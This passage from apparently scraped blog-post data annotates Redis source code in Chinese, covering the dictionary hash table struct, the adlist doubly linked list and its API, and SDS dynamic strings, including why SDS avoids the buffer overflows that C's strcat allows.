dictionary has two of this as we * implement incremental rehashing, for the old to the new table. *//* * 哈希表 * * 每个字典都使用两个哈希表，从而实现渐进式 rehash 。 */typedef struct dictht &#123; // 哈希表数组 dictEntry **table; // 哈希表大小 unsigned long size; // 哈希表大小掩码，用于计算索引值 // 总是等于 size - 1 unsigned long sizemask; // 该哈希表已有节点的数量 unsigned long used;&#125; dictht;","tags":[{"name":"源码","slug":"源码","permalink":"https://jijiking51.cn/tags/源码/"}],"preview":"http://img.jijiking51.cn/redis源码-字典.jpg"},{"title":"redis源码-adlist","text":"Redis链表和链表节点的实现链表的每个节点用listNode结构表示12345678typedef struct listNode &#123; // 前置节点 struct listNode *prev; // 后置节点 struct listNode *next; // 节点值 void *value;&#125; listNode; 多个listNode可以通过prev和next指针组成双端链表 仅使用listNode就可以组成链表，但是还是实现了list来持有链表操作会更加方便12345678910111213typedef struct list &#123; // 链表头结点 listNode *head; // 链表尾节点 listNode *tail; // 函数用于复制链表节点所保存的值 void *(*dup)(void *ptr); // 函数用于释放链表节点所保存的值 void (*free)(void *ptr); // 函数用于对比链表节点所保存的值和另一个输入值是否相等 int (*match)(void *ptr, void *key); unsigned long len;&#125; list; 这是一个list结构的由三个listNode结构组成的链表 redis链表的特性： 双端： 链表节点带有prev和next指针， 获取某个节点的前置节点和后置节点的复杂度都是 O(1) 。 无环： 表头节点的prev指针和表尾节点的next指针都指向NULL， 对链表的访问以NULL为终点。 带表头指针和表尾指针： 通过list结构的head指针和tail指针， 程序获取链表的表头节点和表尾节点的复杂度为 O(1) 。 带链表长度计数器： 程序使用list结构的len属性来对list持有的链表节点进行计数， 程序获取链表中节点数量的复杂度为 O(1)。 多态： 链表节点使用void*指针来保存节点值， 并且可以通过list结构的dup、free、match三个属性为节点值设置类型特定函数， 所以链表可以用于保存各种不同类型的值。 Redis链表API常用API接口 函数 作用 时间复杂度 listSetDupMethod 将给定的函数设置为链表的节点值复制函数。 O(1)。 listGetDupMethod 返回链表当前正在使用的节点值复制函数。 复制函数可以通过链表的dup属性直接获得，O(1) listSetFreeMethod 将给定的函数设置为链表的节点值释放函数。 O(1)。 listGetFree 返回链表当前正在使用的节点值释放函数。 释放函数可以通过链表的free属性直接获得， O(1) listSetMatchMethod 将给定的函数设置为链表的节点值对比函数。 O(1) listGetMatchMethod 返回链表当前正在使用的节点值对比函数。对比函数可以通过链表的match属性直接获得，O(1) listLength 返回链表的长度（包含了多少个节点）。 链表长度可以通过链表的len属性直接获得，O(1) 。 listFirst 返回链表的表头节点。 表头节点可以通过链表的head属性直接获得，O(1)。 listLast 返回链表的表尾节点。 表尾节点可以通过链表的tail属性直接获得， O(1)。 listPrevNode 返回给定节点的前置节点。 前置节点可以通过节点的prev属性直接获得，O(1)。 listNextNode 返回给定节点的后置节点。 后置节点可以通过节点的next属性直接获得，O(1)。 listNodeValue 返回给定节点目前正在保存的值。 节点值可以通过节点的value属性直接获得， O(1)。 listCreate 创建一个不包含任何节点的新链表。 O(1) listAddNodeHead 将一个包含给定值的新节点添加到给定链表的表头。 O(1) listAddNodeTail 将一个包含给定值的新节点添加到给定链表的表尾。 O(1) listInsertNode 将一个包含给定值的新节点添加到给定节点的之前或者之后。 O(1) listSearchKey 查找并返回链表中包含给定值的节点。 O(N)，N为链表长度。 listIndex 返回链表在给定索引上的节点。 O(N) ，N为链表长度。 listDelNode 从链表中删除给定节点。 O(1)。 listRotate 将链表的表尾节点弹出，然后将被弹出的节点插入到链表的表头，成为新的表头节点。 O(1) listDup 复制一个给定链表的副本。 O(N)，N 为链表长度。 listRelease 释放给定链表，以及链表中的所有节点。 O(N)，N为链表长度。 adlist代码注解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521/* Create a new list. The created list can be freed with * AlFreeList(), but private value of every node need to be freed * by the user before to call AlFreeList(). * * On error, NULL is returned. Otherwise the pointer to the new list. *//* * 创建一个新的链表 * * 创建成功返回链表，失败返回 NULL 。 * * T = O(1) */list *listCreate(void)&#123; struct list *list; // 分配内存 if ((list = zmalloc(sizeof(*list))) == NULL) return NULL; // 初始化属性 list-&gt;head = list-&gt;tail = NULL; list-&gt;len = 0; list-&gt;dup = NULL; list-&gt;free = NULL; list-&gt;match = NULL; return list;&#125;/* Free the whole list. * * This function can't fail. *//* * 释放整个链表，以及链表中所有节点 * * T = O(N) */void listRelease(list *list)&#123; unsigned long len; listNode *current, *next; // 指向头指针 current = list-&gt;head; // 遍历整个链表 len = list-&gt;len; while(len--) &#123; next = current-&gt;next; // 如果有设置值释放函数，那么调用它 if (list-&gt;free) list-&gt;free(current-&gt;value); // 释放节点结构 zfree(current); current = next; &#125; // 释放链表结构 zfree(list);&#125;/* Add a new node to the list, to head, contaning the specified 'value' * pointer as value. * * On error, NULL is returned and no operation is performed (i.e. the * list remains unaltered). * On success the 'list' pointer you pass to the function is returned. *//* * 将一个包含有给定值指针 value 的新节点添加到链表的表头 * * 如果为新节点分配内存出错，那么不执行任何动作，仅返回 NULL * * 如果执行成功，返回传入的链表指针 * * T = O(1) */list *listAddNodeHead(list *list, void *value)&#123; listNode *node; // 为节点分配内存 if ((node = zmalloc(sizeof(*node))) == NULL) return NULL; // 保存值指针 node-&gt;value = value; // 添加节点到空链表 if (list-&gt;len == 0) &#123; list-&gt;head = list-&gt;tail = node; node-&gt;prev = node-&gt;next = NULL; // 添加节点到非空链表 &#125; else &#123; node-&gt;prev = NULL; node-&gt;next = list-&gt;head; list-&gt;head-&gt;prev = node; list-&gt;head = node; &#125; // 更新链表节点数 list-&gt;len++; return list;&#125;/* Add a new node to the list, to tail, containing the specified 'value' * pointer as value. * * On error, NULL is returned and no operation is performed (i.e. the * list remains unaltered). * On success the 'list' pointer you pass to the function is returned. *//* * 将一个包含有给定值指针 value 的新节点添加到链表的表尾 * * 如果为新节点分配内存出错，那么不执行任何动作，仅返回 NULL * * 如果执行成功，返回传入的链表指针 * * T = O(1) */list *listAddNodeTail(list *list, void *value)&#123; listNode *node; // 为新节点分配内存 if ((node = zmalloc(sizeof(*node))) == NULL) return NULL; // 保存值指针 node-&gt;value = value; // 目标链表为空 if (list-&gt;len == 0) &#123; list-&gt;head = list-&gt;tail = node; node-&gt;prev = node-&gt;next = NULL; // 目标链表非空 &#125; else &#123; node-&gt;prev = list-&gt;tail; node-&gt;next = NULL; list-&gt;tail-&gt;next = node; list-&gt;tail = node; &#125; // 更新链表节点数 list-&gt;len++; return list;&#125;/* * 创建一个包含值 value 的新节点，并将它插入到 old_node 的之前或之后 * * 如果 after 为 0 ，将新节点插入到 old_node 之前。 * 如果 after 为 1 ，将新节点插入到 old_node 之后。 * * T = O(1) */list *listInsertNode(list *list, listNode *old_node, void *value, int after) &#123; listNode *node; // 创建新节点 if ((node = zmalloc(sizeof(*node))) == NULL) return NULL; // 保存值 node-&gt;value = value; // 将新节点添加到给定节点之后 if (after) &#123; node-&gt;prev = old_node; node-&gt;next = old_node-&gt;next; // 给定节点是原表尾节点 if (list-&gt;tail == old_node) &#123; list-&gt;tail = node; &#125; // 将新节点添加到给定节点之前 &#125; else &#123; node-&gt;next = old_node; node-&gt;prev = old_node-&gt;prev; // 给定节点是原表头节点 if (list-&gt;head == old_node) &#123; list-&gt;head = node; &#125; &#125; // 更新新节点的前置指针 if (node-&gt;prev != NULL) &#123; node-&gt;prev-&gt;next = node; &#125; // 更新新节点的后置指针 if (node-&gt;next != NULL) &#123; node-&gt;next-&gt;prev = node; &#125; // 更新链表节点数 list-&gt;len++; return list;&#125;/* Remove the specified node from the specified list. * It's up to the caller to free the private value of the node. * * This function can't fail. *//* * 从链表 list 中删除给定节点 node * * 对节点私有值(private value of the node)的释放工作由调用者进行。 * * T = O(1) */void listDelNode(list *list, listNode *node)&#123; // 调整前置节点的指针 if (node-&gt;prev) node-&gt;prev-&gt;next = node-&gt;next; else list-&gt;head = node-&gt;next; // 调整后置节点的指针 if (node-&gt;next) node-&gt;next-&gt;prev = node-&gt;prev; else list-&gt;tail = node-&gt;prev; // 释放值 if (list-&gt;free) list-&gt;free(node-&gt;value); // 释放节点 zfree(node); // 链表数减一 list-&gt;len--;&#125;/* Returns a list iterator 'iter'. After the initialization every * call to listNext() will return the next element of the list. * * This function can't fail. *//* * 为给定链表创建一个迭代器， * 之后每次对这个迭代器调用 listNext 都返回被迭代到的链表节点 * * direction 参数决定了迭代器的迭代方向： * AL_START_HEAD ：从表头向表尾迭代 * AL_START_TAIL ：从表尾想表头迭代 * * T = O(1) */listIter *listGetIterator(list *list, int direction)&#123; // 为迭代器分配内存 listIter *iter; if ((iter = zmalloc(sizeof(*iter))) == NULL) return NULL; // 根据迭代方向，设置迭代器的起始节点 if (direction == AL_START_HEAD) iter-&gt;next = list-&gt;head; else iter-&gt;next = list-&gt;tail; // 记录迭代方向 iter-&gt;direction = direction; return iter;&#125;/* Release the iterator memory *//* * 释放迭代器 * * T = O(1) */void listReleaseIterator(listIter *iter) &#123; zfree(iter);&#125;/* Create an iterator in the list private iterator structure *//* * 将迭代器的方向设置为 AL_START_HEAD ， * 并将迭代指针重新指向表头节点。 * * T = O(1) */void listRewind(list *list, listIter *li) &#123; li-&gt;next = list-&gt;head; li-&gt;direction = AL_START_HEAD;&#125;/* * 将迭代器的方向设置为 AL_START_TAIL ， * 并将迭代指针重新指向表尾节点。 * * T = O(1) */void listRewindTail(list *list, listIter *li) &#123; li-&gt;next = list-&gt;tail; li-&gt;direction = AL_START_TAIL;&#125;/* Return the next element of an iterator. * It's valid to remove the currently returned element using * listDelNode(), but not to remove other elements. * * The function returns a pointer to the next element of the list, * or NULL if there are no more elements, so the classical usage patter * is: * * iter = listGetIterator(list,&lt;direction&gt;); * while ((node = listNext(iter)) != NULL) &#123; * doSomethingWith(listNodeValue(node)); * &#125; * * *//* * 返回迭代器当前所指向的节点。 * * 删除当前节点是允许的，但不能修改链表里的其他节点。 * * 函数要么返回一个节点，要么返回 NULL ，常见的用法是： * * iter = listGetIterator(list,&lt;direction&gt;); * while ((node = listNext(iter)) != NULL) &#123; * doSomethingWith(listNodeValue(node)); * &#125; * * T = O(1) */listNode *listNext(listIter *iter)&#123; listNode *current = iter-&gt;next; if (current != NULL) &#123; // 根据方向选择下一个节点 if (iter-&gt;direction == AL_START_HEAD) // 保存下一个节点，防止当前节点被删除而造成指针丢失 iter-&gt;next = current-&gt;next; else // 保存下一个节点，防止当前节点被删除而造成指针丢失 iter-&gt;next = current-&gt;prev; &#125; return current;&#125;/* Duplicate the whole list. On out of memory NULL is returned. * On success a copy of the original list is returned. * * The 'Dup' method set with listSetDupMethod() function is used * to copy the node value. Otherwise the same pointer value of * the original node is used as value of the copied node. * * The original list both on success or error is never modified. *//* * 复制整个链表。 * * 复制成功返回输入链表的副本， * 如果因为内存不足而造成复制失败，返回 NULL 。 * * 如果链表有设置值复制函数 dup ，那么对值的复制将使用复制函数进行， * 否则，新节点将和旧节点共享同一个指针。 * * 无论复制是成功还是失败，输入节点都不会修改。 * * T = O(N) */list *listDup(list *orig)&#123; list *copy; listIter *iter; listNode *node; // 创建新链表 if ((copy = listCreate()) == NULL) return NULL; // 设置节点值处理函数 copy-&gt;dup = orig-&gt;dup; copy-&gt;free = orig-&gt;free; copy-&gt;match = orig-&gt;match; // 迭代整个输入链表 iter = listGetIterator(orig, AL_START_HEAD); while((node = listNext(iter)) != NULL) &#123; void *value; // 复制节点值到新节点 if (copy-&gt;dup) &#123; value = copy-&gt;dup(node-&gt;value); if (value == NULL) &#123; listRelease(copy); listReleaseIterator(iter); return NULL; &#125; &#125; else value = node-&gt;value; // 将节点添加到链表 if (listAddNodeTail(copy, value) == NULL) &#123; listRelease(copy); listReleaseIterator(iter); return NULL; &#125; &#125; // 释放迭代器 listReleaseIterator(iter); // 返回副本 return copy;&#125;/* Search the list for a node matching a given key. * The match is performed using the 'match' method * set with listSetMatchMethod(). If no 'match' method * is set, the 'value' pointer of every node is directly * compared with the 'key' pointer. * * On success the first matching node pointer is returned * (search starts from head). If no matching node exists * NULL is returned. *//* * 查找链表 list 中值和 key 匹配的节点。 * * 对比操作由链表的 match 函数负责进行， * 如果没有设置 match 函数， * 那么直接通过对比值的指针来决定是否匹配。 * * 如果匹配成功，那么第一个匹配的节点会被返回。 * 如果没有匹配任何节点，那么返回 NULL 。 * * T = O(N) */listNode *listSearchKey(list *list, void *key)&#123; listIter *iter; listNode *node; // 迭代整个链表 iter = listGetIterator(list, AL_START_HEAD); while((node = listNext(iter)) != NULL) &#123; // 对比 if (list-&gt;match) &#123; if (list-&gt;match(node-&gt;value, key)) &#123; listReleaseIterator(iter); // 找到 return node; &#125; &#125; else &#123; if (key == node-&gt;value) &#123; listReleaseIterator(iter); // 找到 return node; &#125; &#125; &#125; listReleaseIterator(iter); // 未找到 return NULL;&#125;/* Return the element at the specified zero-based index * where 0 is the head, 1 is the element next to head * and so on. Negative integers are used in order to count * from the tail, -1 is the last element, -2 the penultimate * and so on. If the index is out of range NULL is returned. *//* * 返回链表在给定索引上的值。 * * 索引以 0 为起始，也可以是负数， -1 表示链表最后一个节点，诸如此类。 * * 如果索引超出范围（out of range），返回 NULL 。 * * T = O(N) */listNode *listIndex(list *list, long index) &#123; listNode *n; // 如果索引为负数，从表尾开始查找 if (index &lt; 0) &#123; index = (-index)-1; n = list-&gt;tail; while(index-- &amp;&amp; n) n = n-&gt;prev; // 如果索引为正数，从表头开始查找 &#125; else &#123; n = list-&gt;head; while(index-- &amp;&amp; n) n = n-&gt;next; &#125; return n;&#125;/* Rotate the list removing the tail node and inserting it to the head. *//* * 取出链表的表尾节点，并将它移动到表头，成为新的表头节点。 * * T = O(1) */void listRotate(list *list) &#123; listNode *tail = list-&gt;tail; if (listLength(list) &lt;= 1) return; /* Detach current tail */ // 取出表尾节点 list-&gt;tail = tail-&gt;prev; list-&gt;tail-&gt;next = NULL; /* Move it as head */ // 插入到表头 list-&gt;head-&gt;prev = tail; tail-&gt;prev = NULL; tail-&gt;next = list-&gt;head; list-&gt;head = tail;&#125;","path":"2019/04/16/redis源码-adlist/","date":"04-16","excerpt":"Redis链表和链表节点的实现链表的每个节点用listNode结构表示12345678typedef struct listNode &#123; // 前置节点 struct listNode *prev; // 后置节点 struct listNode *next; // 节点值 void *value;&#125; listNode;","tags":[{"name":"源码","slug":"源码","permalink":"https://jijiking51.cn/tags/源码/"}],"preview":"http://img.jijiking51.cn/redis源码-adlist.jpg"},{"title":"redis源码-sds","text":"SDS-动态字符串定义SDS定义于sds.h/sds.c文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * 这个版本中， 不同的字符串长度使用的都是同一个结构体， * 这样会造成一定的内存浪费 * version 3.0 */ struct sdshdr &#123; // 字符串的长度 unsigned int len; // 记录buf中未使用字节的数量 unsigned int free; // 字节数组，用于保存字符串 char buf[];&#125;;/* * 提供五种header定义，满足各种字符串大小 * len：字符串的长度 * alloc：字符串最大容量 * flags：标记header的类型 * buf： 字节数组，用于保存字符串 * version 5.0 */typedef char *sds;/* Note: sdshdr5 is never used, we just access the flags byte directly. * However is here to document the layout of type 5 SDS strings. */struct __attribute__ ((__packed__)) sdshdr5 &#123; unsigned char flags; /* 3 lsb of type, and 5 msb of string length */ char buf[];&#125;;struct __attribute__ ((__packed__)) sdshdr8 &#123; uint8_t len; /* used */ uint8_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[];&#125;;struct __attribute__ ((__packed__)) sdshdr16 &#123; uint16_t len; /* used */ uint16_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[];&#125;;struct __attribute__ ((__packed__)) sdshdr32 &#123; uint32_t len; /* used */ uint32_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[];&#125;;struct __attribute__ ((__packed__)) sdshdr64 &#123; uint64_t len; /* used */ uint64_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[];&#125;; 例如： 目前：free=0、len=5、buf是一个char类型数组，我们向里面存入redis五个字符，则buf里面将会存入’r’,’e’,’d’,’i’,’s’,’\\0’,最后一个是空字符，这个并不会被len所记录，并且为空字符分配额外的1字节空间，以及添加空字符到字符串末尾等操作都是SDS函数自动完成的，所以这个空字符对于SDS的使用者是完全透明的，这个空字符对于但是却很重要，关系到我们重用C字符串函数库里面的函数 SDS与C的字符串区别常数复杂度获取字符串长度场景：C字符串长度为N，则需要N+1长度数组存储（最后一位存空字符），现在需要获取字符串长度需要的复杂度是多少？答案：O(n)， 过程是我们遍历整个字符串，对每个字符进行计数，直到遇到代表字符串结尾的空字符。 如果是SDS呢，那么我们的时间复杂度是O(1),因为我们的len属性中记录了SDS本身的长度。 杜绝缓冲区溢出除了获取字符串长度的复杂度搞之外，C字符串不记录自身长度带来的另一个问题是容易造成缓冲区溢出例如：1char *strcat(char *dest, const char *src); 我们将src字符串中的内容配接到dest字符串的末尾的时候，因为C字符串不记录自身的长度，所以strcat假定用户在执行这个函数时已经为dest分配了足够多的内存，可以容纳src字符串中的所有内容，如果上述条件不成立，则会产生缓冲区溢出 例如：程序中有两个在内存中紧邻的两个字符串s1,s2分别是’redis’,’mongodb’ 如果这个时候执行strcat(s1,&quot; Cluster&quot;);将s1中的内容修改为’Redis Cluster’，忘记为s1分配足够的空间，那么将会导致s2内容被意外地修改 SDS的空间分配策略完全杜绝了发生缓冲区溢出的可能性，当SDS API需要对SDS进行修改时，API会先检查SDS的空间是否满足修改所需的要求，如果不满足的话API会自动将SDS的空间扩展至执行修改所需的大小，所以SDS不需要手动修改SDS的空间大小也不会出现缓冲区溢出问题。 SDS空间分配策略减少修改字符串时带来的内存重分配次数前面说过，C字符串并不记录自身的长度，对于包含了N个字符的C字符串来说，这个C字符串的底层实现总是一个N+1个字符长的数组，所以每次增长或者缩短一个C字符串都需要一次内存重分配。如果不重新分配会造成两种情况 如果程序增长没有重新分配内存空间大小，会产生缓冲区溢出 如果缩短字符串操作没有重新分配空间，会产生内存泄漏 空间预分配 如果对 SDS 进行修改之后， SDS 的长度（也即是 len 属性的值）将小于 1 MB ， 那么程序分配和 len 属性同样大小的未使用空间， 这时 SDS len 属性的值将和 free 属性的值相同。 举个例子， 如果进行修改之后， SDS 的 len 将变成 13 字节， 那么程序也会分配13 字节的未使用空间， SDS 的 buf 数组的实际长度将变成 13 + 13 + 1 = 27 字节（额外的一字节用于保存空字符）。 如果对 SDS 进行修改之后， SDS 的长度将大于等于 1 MB ， 那么程序会分配 1 MB 的未使用空间。 举个例子， 如果进行修改之后， SDS 的 len 将变成 30 MB ， 那么程序会分配 1 MB 的未使用空间， SDS 的 buf 数组的实际长度将为 30 MB + 1 MB + 1 byte 。 例如： sdscat(s, &quot; Cluster&quot;);,那么 sdscat 将执行一次内存重分配操作， 将 SDS 的长度修改为 13 字节， 并将 SDS 的未使用空间同样修改为 13 字节， 如果这个时候我们再执行sdscat(s, &quot; Tutorial&quot;); 这是因为我们已经有13字节足以保存9字节的” Tutorial”,在扩展 SDS 空间之前， SDS API 会先检查未使用空间是否足够， 如果足够的话， API 就会直接使用未使用空间， 而无须执行内存重分配。 通过这种预分配策略， SDS 将连续增长 N 次字符串所需的内存重分配次数从必定 N 次降低为最多 N 次。 惰性空间释放惰性空间释放用于优化 SDS 的字符串缩短操作： 当 SDS 的 API 需要缩短 SDS 保存的字符串时， 程序并不立即使用内存重分配来回收缩短后多出来的字节， 而是使用 free 属性将这些字节的数量记录起来， 并等待将来使用。例如： S=”XYXXYabcXYY”，我们执行sdstrim(s, &quot;XY&quot;);移除S字符串中的所有 ‘X’ 和 ‘Y’。 这个时候SDS并没有释放多出来的8个字节，而是将这8个字节空间保留在了SDS里面，如果之后对SDS进行增长操作的话，这些空间就能派上用场。 同时，SDS也提供了相应的API，让我们可以在有需要时真正的释放SDS里面的未使用空间，所以不用担心惰性空间释放策略会造成内存浪费。 二进制安全在C字符串中， 除了字符串末尾外，字符串里面不能包含空字符，否则最先被程序读入的空字符将被误认为是字符串结尾，所以不能用来保存二进制数据等一些特殊数据。但是SDS使用buf保存二进制数据，特殊格式等对其无影响，因为SDS使用len属性的值而不是空字符串来判断字符串是否结束。 兼容部分C字符串函数SDS的API是二进制安全的，但它一样遵循C字符串以空字符结尾的惯例，这些API总会将SDS保存的数据的末尾设置为空字符，并且会为buf数组分配空一格字节的空间容纳这个空字符，这是为了让那些文本数据的SDS可以重用一部分&lt;string.h&gt;定义的函数 SDS&nbsp;API常用API 函数 作用 时间复杂度 sdsnew 创建一个包含给定 C 字符串的SDS 。 O(N) ， N 为给定 C 字符串的长度。 sdsempty 创建一个不包含任何内容的空SDS 。 O(1) sdsfree 释放给定的 SDS 。 O(1) sdslen 返回 SDS 的已使用空间字节数。 这个值可以通过读取 SDS 的 len 属性来直接获得，复杂度为 O(1). sdsavail 返回 SDS 的未使用空间字节数。 这个值可以通过读取 SDS 的 free 属性来直接获得， 复杂度为 O(1)。 sdsdup 创建一个给定 SDS 的副本（copy）。 O(N) ， N 为给定 SDS 的长度。 sdsclear 清空 SDS 保存的字符串内容。 因为惰性空间释放策略，复杂度为 O(1)。 sdscat 将给定 C 字符串拼接到 SDS 字符串的末尾。 O(N) ， N 为被拼接 C 字符串的长度。 sdscatsds 将给定 SDS 字符串拼接到另一个 SDS 字符串的末尾。 O(N) ， N 为被拼接 SDS 字符串的长度。 sdscpy 将给定的 C 字符串复制到 SDS 里面， 覆盖 SDS 原有的字符串。 O(N) ， N 为被复制 C 字符串的长度。 sdsgrowzero 用空字符将 SDS 扩展至给定长度。 O(N) ， N 为扩展新增的字节数。 sdsrange 保留 SDS 给定区间内的数据， 不在区间内的数据会被覆盖或清除。 O(N) ， N 为被保留数据的字节数。 sdstrim 接受一个SDS和一个C字符串作为参数， 从 SDS 左右两端分别移除所有在C字符串中出现过的字符。 O(M*N)，M为 SDS的长度，N为给定C字符串的长度。 sdscmp 对比两个SDS字符串是否相同。 O(N)，N为两个SDS中较短的那个 SDS 的长度。 API原码注解 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138238338438538638738838939039139239339439539639739839940040140240340440540640740840941041141241341441541641741841942042142242342442542642742842943043143243343443543643743843944044144244344444544644744844945045145245345445545645745845946046146246346446546646746846947047147247347447547647747847948048148248348448548648748848949049149249349449549649749849950050150250350450550650750850951051151251351451551651751851952052152252352452552652752852953053153253353453553653753853954054154254354454554654754854955055155255355455555655755855956056156256356456556656756856957057157257357457557657757857958058158258358458558658758858959059159259359459559659759859960060160260360460560660760860961061161261361461561661761861962062162262362462562662762862963063163263363463563663763863964064164264364464564664764864965065165265365465565665765865966066166266366466566666766866967067167267367467567667767867968068168268368468568668768868969069169269369469569669769869970070170270370470570670770870971071171271371471571671771871972072172272372472572672772872973073173273373473573673773873974074174274374474574674774874975075175275375475575675775875976076176276376476576676776876977077177277377477577677777877978078178278378478578678778878979079179279379479579679779879980080180280380480580680780880981081181281381481581681781881982082182282382482582682782882983083183283383483583683783883984084184284384484584684784884985085185285385485585685785885986086186286386486586686786886987087187287387487587687787887988088188288388488588688788888989089189289389489589689789889990090190290390490590690790890991091191291391491591691791891992092192292392492592692792892993093193293393493593693793893994094194294394494594694794894995095195295395495595695795895996096196296396496596696796896997097197297397497597697797897998098198298398498598698798898999099199299399499599699799899910001001100210031004100510061007100810091010101110121013101410151016101710181019102010211022102310241025102610271028102910301031103210331034103510361037103810391040104110421043104410451046104710481049105010511052105310541055105610571058105910601061106210631064106510661067106810691070107110721073107410751076107710781079108010811082108310841085108610871088108910901091109210931094109510961097109810991100110111021103110411051106110711081109111011111112111311141115111611171118111911201121112211231124112511261127112811291130113111321133113411351136113711381139114011411142114311441145114611471148114911501151115211531154115511561157115811591160116111621163116411651166116711681169117011711172117311741175117611771178117911801181118211831184118511861187118811891190119111921193119411951196119711981199120012011202120312041205120612071208120912101211121212131214121512161217121812191220122112221223122412251226122712281229123012311232123312341235123612371238123912401241124212431244124512461247124812491250125112521253125412551256125712581259126012611262126312641265126612671268126912701271127212731274127512761277127812791280128112821283128412851286128712881289129012911292129312941295129612971298129913001301130213031304130513061307130813091310131113121313131413151316131713181319132013211322132313241325132613271328132913301331133213331334133513361337133813391340/* * 根据给定的初始化字符串 init 和字符串长度 initlen * 创建一个新的 sds * * 参数 * init ：初始化字符串指针 * initlen ：初始化字符串的长度 * * 返回值 * sds ：创建成功返回 sdshdr 相对应的 sds * 创建失败返回 NULL * * 复杂度 * T = O(N) *//* Create a new sds string with the content specified by the 'init' pointer * and 'initlen'. * If NULL is used for 'init' the string is initialized with zero bytes. * * The string is always null-termined (all the sds strings are, always) so * even if you create an sds string with: * * mystring = sdsnewlen(\"abc\",3\"); * * You can print the string with printf() as there is an implicit \\0 at the * end of the string. However the string is binary safe and can contain * \\0 characters in the middle, as the length is stored in the sds header. */sds sdsnewlen(const void *init, size_t initlen) &#123; struct sdshdr *sh; // 根据是否有初始化内容，选择适当的内存分配方式 // T = O(N) if (init) &#123; // zmalloc 不初始化所分配的内存 sh = zmalloc(sizeof(struct sdshdr)+initlen+1); &#125; else &#123; // zcalloc 将分配的内存全部初始化为 0 sh = zcalloc(sizeof(struct sdshdr)+initlen+1); &#125; // 内存分配失败，返回 if (sh == NULL) return NULL; // 设置初始化长度 sh-&gt;len = initlen; // 新 sds 不预留任何空间 sh-&gt;free = 0; // 如果有指定初始化内容，将它们复制到 sdshdr 的 buf 中 // T = O(N) if (initlen &amp;&amp; init) memcpy(sh-&gt;buf, init, initlen); // 以 \\0 结尾 sh-&gt;buf[initlen] = '\\0'; // 返回 buf 部分，而不是整个 sdshdr return (char*)sh-&gt;buf;&#125;/* * 创建并返回一个只保存了空字符串 \"\" 的 sds * * 返回值 * sds ：创建成功返回 sdshdr 相对应的 sds * 创建失败返回 NULL * * 复杂度 * T = O(1) *//* Create an empty (zero length) sds string. Even in this case the string * always has an implicit null term. */sds sdsempty(void) &#123; return sdsnewlen(\"\",0);&#125;/* * 根据给定字符串 init ，创建一个包含同样字符串的 sds * * 参数 * init ：如果输入为 NULL ，那么创建一个空白 sds * 否则，新创建的 sds 中包含和 init 内容相同字符串 * * 返回值 * sds ：创建成功返回 sdshdr 相对应的 sds * 创建失败返回 NULL * * 复杂度 * T = O(N) *//* Create a new sds string starting from a null termined C string. */sds sdsnew(const char *init) &#123; size_t initlen = (init == NULL) ? 0 : strlen(init); return sdsnewlen(init, initlen);&#125;/* * 复制给定 sds 的副本 * * 返回值 * sds ：创建成功返回输入 sds 的副本 * 创建失败返回 NULL * * 复杂度 * T = O(N) *//* Duplicate an sds string. */sds sdsdup(const sds s) &#123; return sdsnewlen(s, sdslen(s));&#125;/* * 释放给定的 sds * * 复杂度 * T = O(N) *//* Free an sds string. No operation is performed if 's' is NULL. */void sdsfree(sds s) &#123; if (s == NULL) return; zfree(s-sizeof(struct sdshdr));&#125;// 未使用函数，可能已废弃/* Set the sds string length to the length as obtained with strlen(), so * considering as content only up to the first null term character. * * This function is useful when the sds string is hacked manually in some * way, like in the following example: * * s = sdsnew(\"foobar\"); * s[2] = '\\0'; * sdsupdatelen(s); * printf(\"%d\\n\", sdslen(s)); * * The output will be \"2\", but if we comment out the call to sdsupdatelen() * the output will be \"6\" as the string was modified but the logical length * remains 6 bytes. */void sdsupdatelen(sds s) &#123; struct sdshdr *sh = (void*) (s-(sizeof(struct sdshdr))); int reallen = strlen(s); sh-&gt;free += (sh-&gt;len-reallen); sh-&gt;len = reallen;&#125;/* * 在不释放 SDS 的字符串空间的情况下， * 重置 SDS 所保存的字符串为空字符串。 * * 复杂度 * T = O(1) *//* Modify an sds string on-place to make it empty (zero length). * However all the existing buffer is not discarded but set as free space * so that next append operations will not require allocations up to the * number of bytes previously available. */void sdsclear(sds s) &#123; // 取出 sdshdr struct sdshdr *sh = (void*) (s-(sizeof(struct sdshdr))); // 重新计算属性 sh-&gt;free += sh-&gt;len; sh-&gt;len = 0; // 将结束符放到最前面（相当于惰性地删除 buf 中的内容） sh-&gt;buf[0] = '\\0';&#125;/* Enlarge the free space at the end of the sds string so that the caller * is sure that after calling this function can overwrite up to addlen * bytes after the end of the string, plus one more byte for nul term. * * Note: this does not change the 